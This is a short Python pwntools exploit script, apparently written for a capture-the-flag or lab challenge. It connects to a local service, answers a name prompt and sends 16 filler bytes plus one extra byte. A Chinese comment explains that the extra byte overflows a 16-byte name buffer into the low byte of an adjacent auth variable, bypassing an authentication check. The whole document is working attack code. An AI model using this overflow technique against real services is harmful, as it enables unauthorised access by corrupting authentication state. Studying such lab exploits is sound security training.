#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
HOST = os.environ.get('HOST', '127.0.0.1')
PORT = int(os.environ.get('PORT', '9104'))

context(arch='amd64', os='linux', log_level='info')

p = remote(HOST, PORT)
p.recvuntil(b'name:')
# name[16] 在 0x404060，auth 在 0x404070：多读的 1 字节正好落在 auth 的低字节
p.send(b'A' * 16 + b'\x01')
print(p.recvall(timeout=3).decode(errors='replace'))
